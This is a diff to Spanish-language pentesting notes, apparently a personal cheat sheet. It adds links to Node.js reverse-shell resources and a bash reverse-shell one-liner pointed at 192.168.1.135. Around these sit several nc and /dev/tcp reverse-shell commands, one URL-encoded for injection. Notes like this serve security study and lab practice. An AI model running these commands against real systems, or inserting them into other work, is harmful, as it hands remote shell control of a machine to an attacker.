@@ -79,6 +79,8 @@ done
 
 - [RevShell](https://www.revshells.com/)
 - [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [Buena Node.js Reverse](https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)
+- [Node.js](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell) 
 
 >En este caso mando una shell y me pongo a la escucha desde la ip atacante
 
@@ -86,13 +88,14 @@ done
 
 ```bash
 nc -e /bin/bash ip_atacante 8080
- 
+
+bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/6501 0>&1'
 bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
 bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"
 bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/ip_atacante/port%200>%261"
 bash -i >& /dev/tcp/ip_atacante/port 0>&1
 
-# En meterpreter
+# En meterpreter para estar más cómodos
 /bin/bash -i
 ```
 
